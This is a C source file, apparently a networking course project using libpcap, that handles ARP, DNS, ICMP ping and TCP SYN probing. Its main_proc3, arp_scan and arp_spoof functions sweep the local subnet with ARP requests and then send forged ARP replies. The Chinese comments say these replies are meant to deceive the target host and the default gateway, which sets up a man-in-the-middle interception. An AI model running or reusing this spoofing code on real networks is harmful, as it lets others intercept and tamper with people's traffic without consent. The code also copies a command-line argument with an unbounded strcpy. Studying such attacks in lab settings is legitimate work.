#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>

#include "arp.h"
#include "dns.h"
#include "icmp.h"
#include "netdevice.h"
#include "tcp.h"
#include "util.h"

extern char *defdnsquery;
extern uint16_t tcp_filter_port;

void rcvd_raw_tcp(myip_hdr_t *ip_hdr, mytcp_hdr_t *tcp_hdr, uint8_t *data,
                  int len) {
  if (swap16(tcp_hdr->dstport) != tcp_filter_port) return;
  if (tcp_hdr->flags & TCP_FG_SYN && tcp_hdr->flags & TCP_FG_ACK) {
    printf("Received SYN-ACK from %s:%d\n", ip_addrstr(ip_hdr->srcip, NULL),
           swap16(tcp_hdr->srcport));
  }
  if (tcp_hdr->flags & TCP_FG_RST) {
    printf("Received RST from %s:%d\n", ip_addrstr(ip_hdr->srcip, NULL),
           swap16(tcp_hdr->srcport));
  }
}

/**
 * main_proc() - the main thread
 **/
int main_proc(netdevice_t *p) {
  char buf[MAX_LINEBUF];
  ipaddr_t ip;
  int key;

#if (FG_ARP_SEND_REQUEST == 1)
  arp_request(p, NULL);
#endif /* FG_ARP_REQUEST */

#if (FG_DNS_QUERY == 1)
  ip = resolve(p, defdnsquery);
  printf("main_proc(): %s = %s\n", defdnsquery,
         ip_addrstr((uint8_t *)&ip, NULL));
#if (FG_ICMP_SEND_REQUEST == 1)
  icmp_ping(p, (uint8_t *)&ip);
#endif  // FG_ICMP_SEND_REQUEST
#if (FG_TCP_SEND_SYN == 1)
  mytcp_param_t tcp_param;
  COPY_IPV4_ADDR(tcp_param.ip.dstip, (uint8_t *)&ip);
  tcp_param.srcport = tcp_filter_port;
  tcp_param.dstport = 80;

  tcp_syn(p, tcp_param, NULL, 0);
#endif  // FG_TCP_SEND_SYN
#endif  // FG_DNS_QUERY

  /* Read the packets */
  while (1) {
    /*
     * Proccess packets in the capture buffer
     */
    if (netdevice_rx(p) == -1) {
      break;
    }

    /*----------------------------------*
     * Other works can be inserted here *
     *----------------------------------*/

    /* key pressed? */
    if (!readready()) continue;
    if ((key = fgetc(stdin)) == '\n') break;
    ungetc(key, stdin);
    if (fgets(buf, MAX_LINEBUF, stdin) == NULL) break;
    trimright(buf);
    if ((ip = retrieve_ip_addr(buf)) != 0 || (ip = resolve(p, buf)) != 0) {
      printf("main_proc(): %s = %s\n", buf, ip_addrstr((uint8_t *)&ip, NULL));
#if (FG_DNS_DO_PING == 1)
      icmp_ping(p, (uint8_t *)&ip);
#endif  // FG_DNS_DO_PING
#if (FG_TCP_SEND_SYN == 1)
      mytcp_param_t tcp_param;
      COPY_IPV4_ADDR(tcp_param.ip.dstip, (uint8_t *)&ip);
      tcp_param.srcport = tcp_filter_port;
      tcp_param.dstport = 80;

      tcp_syn(p, tcp_param, NULL, 0);
#endif  // FG_TCP_SEND_SYN
    } else {
      printf("Invalid IP (Enter to exit)\n");
    }
  }

  return 0;
}

int main_proc3(netdevice_t *p) {
  char buf[MAX_LINEBUF];
  ipaddr_t ip;
  int key;

  // 利用 ARP request 掃描子網
  arp_scan(p);

  while (1) {
    /*
     * Proccess packets in the capture buffer
     */
    if (netdevice_rx(p) == -1) {
      break;
    }

    /*----------------------------------*
     * Other works can be inserted here *
     *----------------------------------*/

    /*
     * If key is not pressed, continue to next loop
     */
    if (!readready()) {
      continue;
    }
    /*
     * If user pressed enter, exit the program
     */
    if ((key = fgetc(stdin)) == '\n') {
      break;
    }
    ungetc(key, stdin);

    if (key == 'a') {
      ipethaddr_t *ip_eth_p = arptable_select();
      uint8_t *defareth = arptable_existed(defarpip);

      // 騙目標主機
      arp_spoof(p, ip_eth_p->eth, &(ip_eth_p->ip), defarpip);
      // 騙預設閘道器
      arp_spoof(p, defareth, defarpip, &(ip_eth_p->ip));
    }

    if (fgets(buf, MAX_LINEBUF, stdin) == NULL) {
      break;
    }
    if ((ip = retrieve_ip_addr(buf)) == 0) {
      printf("Invalid IP (Enter to exit)\n");
    } else {
      arp_request(p, (unsigned char *)&ip);
    }
  }
}

void arp_scan(netdevice_t *p) {
  // 計算 netmask 長度
  int mask_len = 0;
  for (int i = 0; mynetmask[i] != 0; i++) {
    uint8_t mask_1 = 0x80;
    for (int j = 0; j < 8; j++) {
      if ((mynetmask[i] & (mask_1 >> j)) == 0) {
        break;
      }
      mask_len++;
    }
  }
  
  uint8_t target_ip[IPV4_ADDR_LEN];
  for (int i = 0; i < IPV4_ADDR_LEN; i++) {
    target_ip[i] = myipaddr[i] & mynetmask[i];
    // printf("%d ", target_ip[i]);
  }

  int host_num = (1 << (32-mask_len)) - 2;
  for (int i = 1; i <= host_num; i++) {

    if (target_ip[3]++ == 0xff) {
      if (target_ip[2]++ == 0xff) {
        if (target_ip[1]++ == 0xff) {
          target_ip[0]++;
        }
      }
    }
    
    arp_request(p, (uint8_t *)&target_ip);
  }
}

void arp_spoof(netdevice_t *p, uint8_t *dsteth, uint8_t *dstip, uint8_t *srcip) {
  eth_hdr_t eth_hdr;
  myarp_t pkt;

  COPY_ETH_ADDR(eth_hdr.eth_dst, dsteth);
  COPY_ETH_ADDR(eth_hdr.eth_src, myethaddr);
  eth_hdr.eth_type = ETH_ARP;

  pkt.ethtype = ARP_ETH_TYPE;
  pkt.iptype = ETH_IP;
  pkt.ethlen = ETH_ADDR_LEN;
  pkt.iplen = IPV4_ADDR_LEN;
  pkt.op = ARP_OP_REPLY;
  COPY_ETH_ADDR(pkt.srceth, myethaddr);
  COPY_IPV4_ADDR(pkt.srcip, srcip);
  COPY_ETH_ADDR(pkt.dsteth, dsteth);
  COPY_IPV4_ADDR(pkt.dstip, dstip);

#if (DEBUG_ARP_REPLY == 1)
  printf("arp_reply() to %s\n", ip_addrstr(dstip, NULL));
#endif /* DEBUG_ARP_REPLY */

  if (netdevice_xmit(p, eth_hdr, (uint8_t *)&pkt, sizeof(pkt)) != 0) {
    fprintf(stderr, "Failed to send ARP reply.\n");
  }
}

/****
 ****	MAIN ENTRY
 ****/

int main(int argc, char *argv[]) {
  char devname[MAX_LINEBUF], errbuf[PCAP_ERRBUF_SIZE];
  netdevice_t *p;

  /*
   * Get the device name of capture interface
   */
  if (argc == 2) {
    strcpy(devname, argv[1]);
  } else if (netdevice_getdevice(0, devname) == NETDEVICE_ERR) {
    return -1;
  }

  /*
   * Open the specified interface
   */
  if ((p = netdevice_open(devname, errbuf)) == NULL) {
    fprintf(stderr, "Failed to open capture interface\n\t%s\n", errbuf);
    return -1;
  }
  printf("Capturing packets on interface %s\n", devname);

  /*
   * Register the packet handler callback of specific protocol
   */
  netdevice_add_proto(p, ETH_ARP, (ptype_handler)&arp_main);
  netdevice_add_proto(p, ETH_IP, (ptype_handler)&ip_main);
  tcp_set_raw_handler((tcp_raw_handler)&rcvd_raw_tcp);

  main_proc3(p);

  /*
   * Clean up the resources
   */
  netdevice_close(p);
}